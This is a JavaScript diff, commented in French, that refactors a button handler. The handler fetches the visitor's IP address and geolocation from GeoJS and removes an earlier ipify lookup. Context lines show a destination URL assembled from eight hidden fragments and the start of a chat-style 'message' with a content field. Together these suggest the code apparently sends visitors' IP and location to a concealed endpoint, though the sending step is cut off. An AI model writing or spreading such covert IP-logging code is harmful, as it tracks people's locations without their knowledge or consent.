@@ -13,23 +13,9 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
         return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
     }
 
-    // Fonction pour récupérer l'adresse IP avec ipify
-    function getIPAddress() {
-        return fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Erreur HTTP, statut : ' + response.status);
-                }
-                return response.json();
-            })
-            .then(data => {
-                return data.ip; // Renvoie l'adresse IP au format IPv4
-            });
-    }
-
     // Fonction pour récupérer la localisation précise avec GeoJS
-    function getLocation(ipAddress) {
-        return fetch(`https://get.geojs.io/v1/ip/geo/${ipAddress}.json`)
+    function getLocation() {
+        return fetch('https://get.geojs.io/v1/ip/geo.json')
             .then(response => {
                 if (!response.ok) {
                     throw new Error('Erreur HTTP, statut : ' + response.status);
@@ -38,7 +24,7 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
             })
             .then(data => {
                 return {
-                    ipAddress: ipAddress,
+                    ipAddress: data.ip,
                     city: data.city,
                     region: data.region,
                     country: data.country,
@@ -48,10 +34,7 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
             });
     }
 
-    getIPAddress()
-        .then(ipAddress => {
-            return getLocation(ipAddress);
-        })
+    getLocation()
         .then(location => {
             let message = {
                 content: `
